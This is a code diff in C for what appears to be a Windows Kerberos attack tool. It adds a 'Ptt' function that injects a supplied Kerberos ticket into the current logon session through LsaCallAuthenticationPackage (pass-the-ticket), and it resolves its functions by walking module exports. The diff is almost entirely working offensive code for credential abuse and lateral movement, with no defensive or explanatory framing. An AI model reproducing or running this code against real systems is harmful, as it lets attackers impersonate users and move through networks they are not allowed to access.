@@ -274,3 +274,48 @@ NTSTATUS PreAuth(char *user, char *passwd, char *domain, char *spn,
 
   return status;
 }
+
+NTSTATUS Ptt(PVOID data, DWORD dataSize) {
+  NTSTATUS status, protocolStatus;
+  DWORD submitSize, responseSize;
+  PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
+  PVOID dumPtr;
+
+  // get important functions.
+  size_t ntdll = get_mod_base("ntdll.dll");
+  RtlCopyMemory_t RtlCopyMemory =
+      (RtlCopyMemory_t)get_function_from_exports(ntdll, "RtlCopyMemory");
+  HMODULE secure32 = LoadLibraryA("secur32.dll");
+  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
+      (LsaCallAuthenticationPackage_t)GetProcAddress(
+          secure32, "LsaCallAuthenticationPackage");
+  if (!LsaCallAuthenticationPackage) {
+    printf("GetProcAddress failed: 0x%lx\n", GetLastError());
+    return -1;
+  }
+
+  // build submit
+  submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
+  pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize);
+  pKerbSubmit->MessageType = KerbSubmitTicketMessage;
+  pKerbSubmit->KerbCredSize = dataSize;
+  pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
+  pKerbSubmit->LogonId.HighPart = 0;
+  pKerbSubmit->LogonId.LowPart = 0;
+  RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, data,
+                dataSize);
+  HANDLE hlsa = NewLsaCredentialHandle();
+  LONG kerb = GetAuthPackage(hlsa, "Kerberos");
+  status = LsaCallAuthenticationPackage(hlsa, kerb, pKerbSubmit, submitSize,
+                                        &dumPtr, &responseSize,
+                                        &protocolStatus); // submit ticket!
+  printf("status: 0x%lX, protocolStatus: 0x%lX\n", status, protocolStatus);
+  if (status != 0) {
+    LocalFree(pKerbSubmit);
+    return status;
+  }
+  status = protocolStatus;
+  LocalFree(pKerbSubmit);
+
+  return status;
+}
